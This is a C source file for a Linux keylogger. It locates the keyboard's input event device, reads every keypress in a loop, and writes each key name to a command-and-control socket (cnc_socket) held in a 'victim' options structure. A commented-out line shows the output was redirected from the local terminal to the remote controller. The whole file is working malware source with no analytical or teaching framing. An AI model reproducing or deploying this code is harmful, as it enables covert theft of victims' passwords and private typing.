#include "keylogger.h"

int loop = 1;

void keylogger_main(struct options_victim* ov) {
    int keyboard, monitor_fd;
    char *KEYBOARD_DEVICE = NULL;

    monitor_fd = STDOUT_FILENO;
    KEYBOARD_DEVICE = get_keyboard_event_file();

    keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
    keylogger(keyboard, monitor_fd, ov);
}


void keylogger(int keyboard, int monitor_fd, struct options_victim* ov) {
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;

    signal(SIGINT, sigint_handler);
    while(loop){
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for (i = 0; i < (bytesRead / eventSize); ++i){
            if (events[i].type == EV_KEY) {
                if (events[i].value == 1) {
                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                        safe_write_all(monitor_fd, keycodes[events[i].code], keyboard, ov);
//                        safe_write_all(monitor_fd, "\n", keyboard, ov);
                    }
                    else {
                        write(monitor_fd, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }
//    if (bytesRead > 0) safe_write_all(monitor_fd, "\n", keyboard, ov);
}


void safe_write_all(int file_desc, const char *str, int keyboard, struct options_victim* ov){
    struct sigaction new_actn, old_actn;
    new_actn.sa_handler = SIG_IGN;
    sigemptyset(&new_actn.sa_mask);
    new_actn.sa_flags = 0;

    sigaction(SIGPIPE, &new_actn, &old_actn);

    if (!write_all(file_desc, str, ov)){
        close(file_desc);
        close(keyboard);
        perror("\nwriting");
        exit(1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}


int write_all(int file_desc, const char *str, struct options_victim* ov) {
    int bytesWritten = 0;
    int bytesToWrite = (int)strlen(str);

    uint16_t size = (uint16_t)strlen(str);


    do {
//        bytesWritten = (int)write(file_desc, str, bytesToWrite);
        bytesWritten = (int)write(ov->cnc_socket, str, size);
        if(bytesWritten == -1) {
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}


void sigint_handler(int sig) {
    loop = 0;
}


char* get_keyboard_event_file(void) {
    char *keyboard_file = NULL;
    int num, i;
    struct dirent **event_files;
    char filename[512];

    num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
    if(num < 0){
        return NULL;
    }

    else {
        for(i = 0; i < num; ++i){
            int32_t event_bitmap = 0;
            int fd;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
            fd = open(filename, O_RDONLY);

            if(fd == -1){
                perror("open");
                continue;
            }

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if((EV_KEY & event_bitmap) == EV_KEY){
                // The device acts like a keyboard

                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if((kbd_bitmap & event_bitmap) == kbd_bitmap){
                    // The device supports A, B, C, Z keys, so it probably is a keyboard
                    keyboard_file = strdup(filename);
                    close(fd);
                    break;
                }

            }
            close(fd);
        }
    }
    // Cleanup scandir
    for(i = 0; i < num; ++i){
        free(event_files[i]);
    }

    free(event_files);

    return keyboard_file;
}


static int is_char_device(const struct dirent *file) {
    struct stat filestat;
    char filename[512];
    int err;

    snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

    err = stat(filename, &filestat);
    if(err){
        return 0;
    }

    return S_ISCHR(filestat.st_mode);
}
